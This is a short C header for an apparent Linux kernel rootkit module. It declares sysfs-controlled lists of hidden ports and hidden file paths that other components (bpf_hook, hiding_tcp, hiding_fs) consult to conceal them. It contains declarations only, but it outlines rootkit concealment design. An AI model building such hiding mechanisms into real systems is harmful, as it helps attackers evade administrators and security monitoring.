#ifndef BAT_SYSFS_IFACE_H
#define BAT_SYSFS_IFACE_H

#include <linux/types.h>

#define MAX_HIDDEN_PATHS   16
#define MAX_PATH_LEN       256

/* Hidden ports array   each write to sysfs hide_port appends one entry.
 * Read by bpf_hook and hiding_tcp via is_hidden_port().
 * All accesses use READ_ONCE; writes happen only from process context (sysfs). */
#define MAX_HIDDEN_PORTS   8
extern u16  bat_hidden_ports[MAX_HIDDEN_PORTS];
extern int  bat_hidden_port_count;

/* Hidden paths   read by hiding_fs (S2) */
extern char bat_hidden_paths[MAX_HIDDEN_PATHS][MAX_PATH_LEN];
extern int  bat_hidden_path_count;

int  sysfs_iface_init(void);
void sysfs_iface_exit(void);

#endif /* BAT_SYSFS_IFACE_H */
